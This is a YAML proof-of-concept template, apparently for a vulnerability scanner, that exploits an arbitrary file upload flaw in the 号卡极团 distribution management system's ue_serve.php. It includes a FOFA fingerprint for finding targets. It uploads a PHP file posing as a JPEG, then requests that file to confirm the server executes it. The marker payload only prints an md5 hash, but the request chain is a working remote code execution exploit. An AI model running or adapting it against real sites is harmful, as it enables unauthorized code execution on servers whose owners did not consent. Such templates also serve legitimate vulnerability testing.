id: poc-yaml-haokajt-ue-serve-upload
info:
  name: 号卡极团分销管理系统 ue_serve.php 任意文件上传
  severity: critical
  tags:
  - 文件上传
  finger: 号卡极团管理系统
  fofa: icon_hash="-795291075"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /admin/controller/ue_serve.php?action=image&encode=utf-8
  headers:
    Content-Type: multipart/form-data; boundary=----iiqvnofupvhdyrcoqyuujyetjvqgocod
  data: '------iiqvnofupvhdyrcoqyuujyetjvqgocod

    Content-Disposition: form-data; name="name"


    1.php

    ------iiqvnofupvhdyrcoqyuujyetjvqgocod

    Content-Disposition: form-data; name="upfile"; filename="1.php"

    Content-Type: image/jpeg


    This website has a vulnerability!!! <?php echo md5({{.t1}});?>

    ------iiqvnofupvhdyrcoqyuujyetjvqgocod--'
  expression: status_code == 200
  output:
  - regex_match(body, `/upload\\\/(?P<filename>.*?).php`)
- method: GET
  path: /upload/{{.filename}}.php
  expression: "status_code == 200 && \ncontains(body,t2) && \ncontains(body,\"This\
    \ website has a vulnerability!!!\")\n"
transport: http
